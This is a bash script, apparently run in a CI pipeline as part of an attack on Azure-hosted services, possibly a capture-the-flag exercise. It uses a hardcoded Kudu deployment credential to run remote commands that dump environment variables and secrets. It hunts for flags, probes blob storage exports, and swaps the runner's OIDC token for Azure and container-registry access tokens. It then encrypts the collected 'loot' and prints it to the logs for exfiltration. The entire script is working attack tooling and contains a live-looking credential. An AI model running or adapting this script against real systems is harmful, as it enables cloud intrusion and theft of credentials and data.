#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"
SCMH="app-tbl-reporting-prod.scm.azurewebsites.net"
CRED=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
echo "=== RUNNER SHELL PROOF $(date -u) ==="
id; whoami; hostname; uname -a
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
cat > /tmp/kudu.py <<'PYEOF'
import json,sys,os,urllib.request
cred=os.environ['CRED']; cmd=sys.argv[1]
body=json.dumps({"command":"bash -c "+json.dumps(cmd),"dir":"/home/site/wwwroot"}).encode()
req=urllib.request.Request("https://"+os.environ['SCMH']+"/api/command",data=body,headers={"Content-Type":"application/json","Authorization":"Basic "+cred})
try: print(urllib.request.urlopen(req,timeout=90).read().decode()[:9000])
except Exception as e: print("ERR",e)
PYEOF
export CRED SCMH
k(){ say "--- $1"; say "$(python3 /tmp/kudu.py "$1")"; }
k 'id; cat /proc/1/cmdline; echo; cat /home/site/wwwroot/startup.sh 2>/dev/null; ls -la /home/site/wwwroot'
k 'env | sort'
k 'for p in /proc/[0-9]*; do tr "\0" "\n" < $p/environ 2>/dev/null; done | sort -u | grep -iE "config|storage|flag|secret|token|key|connection"'
k 'find / -xdev -iname "*flag*" 2>/dev/null | head -30'
k 'grep -rIoh -E ".{0,40}(flag|FLAG|TBL|CTF)\{[^}]{2,100}\}" /home /tmp /opt /var 2>/dev/null | head -20'
for B in flag flag.txt flag.json secret.json data.json export.json report.json shipments.json index.json latest.json manifest.json backup.json TBL-SHP-48213.json reports.json; do
  R=$(curl -sS -o /dev/null -w '%{http_code}:%{size_download}' "${SC}sttblbackupprodx3euoz.blob.core.windows.net/exports/$B")
  say "EXPORT $B -> $R"
done
AAD="${SC}login.microsoftonline.com"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
AR=$(curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
ACR=crtblplatprodx3euoz.azurecr.io
RT=$(curl -sS -X POST "${SC}$ACR/oauth2/exchange" -d "grant_type=access_token" -d "service=$ACR" -d "tenant=$AZURE_TENANT_ID" --data-urlencode "access_token=$AR")
say "ACREXCH $(printf '%s' "$RT" | head -c 300)"
RTOK=$(printf '%s' "$RT" | jq -r '.refresh_token // empty')
if [ -n "$RTOK" ]; then
  AT=$(curl -sS -X POST "${SC}$ACR/oauth2/token" -d "grant_type=refresh_token" -d "service=$ACR" --data-urlencode "scope=repository:*:pull" --data-urlencode "refresh_token=$RTOK" | jq -r '.access_token // empty')
  say "ACRTOKEN len=${#AT}"
  for R in tebamoto-reporting-api catalog-api; do
    say "ACRTAGS $R: $(curl -sS -H "Authorization: Bearer $AT" "${SC}$ACR/v2/$R/tags/list" | head -c 400)"
  done
fi
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
